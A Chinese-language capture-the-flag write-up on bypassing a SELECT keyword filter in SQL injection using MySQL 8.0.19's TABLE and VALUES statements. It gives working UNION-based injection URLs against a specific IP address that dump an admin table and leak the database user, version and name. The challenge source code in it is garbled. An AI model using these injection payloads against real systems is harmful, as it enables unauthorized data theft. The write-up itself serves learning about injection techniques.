在P师傅小密圈看到了一道有意思的注入题
http://47.98.160.61/1.php?showme=1
代码如下：
1
$title";
18
19
echo "$content";
从代码上来看，过滤了select，这里代码的过滤我是绕不过去，所以把重点放在了“如何在不使用select关键字的
情况下，依旧可以注入”
在2019强网杯，有一道类似的题是可以使用堆叠注入，通过预处理语句拼接关键字进行绕过，但是这里的代码并
不支持堆叠注入
猜测这里的tips可能和mysql的版本特性有关系。不能使用select，但是可以通过盲注先获取一下mysql的版本信
息
通过盲注得到mysql版本为: 8.0.20-0ubuntu0.20.04.1
猜测和版本特性有关，于是查看了mysql的官方文档，在当中查找到了答案：
https://dev.mysql.com/doc/refman/8.0/en/table.html
https://dev.mysql.com/doc/refman/8.0/en/values.html
https://dev.mysql.com/doc/refman/8.0/en/union.html
在mysql8.0.19当中引入了两个DML语句，table和values
table
mysql8.0.19引入，返回命名表的行和列
1
TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
简单概括一下文档中介绍的（个人理解）
table table_name相当于select * from table_name，可以理解为这两个语句产生的执行效果是一样的，但是
table table_name使用时有一些限制如下：
1、只能显示表的所有列，也就是没有办法获取指定的列
2、不能使用where子句
所以当存在两个表A和B，并且A和B的列数一样时，当注入点如下：
select * from A where xxx=xxx
就可以构造
select * from A where xxx=xxx and 1=2 union table B-- -
此时如果页面有回显,就可以获取到B表的数据
所以这道题可以用这个方式获取admin表的数据（一开始提示了两个表的列数相同）
http://47.98.160.61/1.php?showme=1&id=-1%27%20%20union%20table%20admin--%20-
values
mysql8.0.19引入，返回一组一个或多个行作为表。换句话说，它是一个表值构造函数，还可以充当独立的SQL语
句
1
VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]
2
3
row_constructor_list:
4
 ROW(value_list)[, ROW(value_list)][, ...]
5
6
value_list:
7
 value[, value][, ...]
8
9
column_designator:
10
 column_index
理解：
通过执行：values row(1,2,...)[row(3,4,...)]，会生成一个表，表的列名为column_0、column_1....
select * from A where xxx=xxx union values row(1,2,3);
类似于
select * from A where xxx=xxx union select 1,2,3;
所以在不能使用select的情况下，可以通过values DML语句判断表的列数，回显一些信息等
判断出列数为3，以及回显的位置
http://47.98.160.61/1.php?showme=1&id=-1%27%20%20union%20values%20row(1,2,3)--%20-
回显一些数据库信息
http://47.98.160.61/1.php?
showme=1&id=-1%27%20%20union%20values%20row(1,concat(user(),0x3a,version(),0x3a,database()),3)-
-%20-
一些未解决的问题：
当列数不同时，或者在当不知道表名的情况下，如何才能通过回显获取数据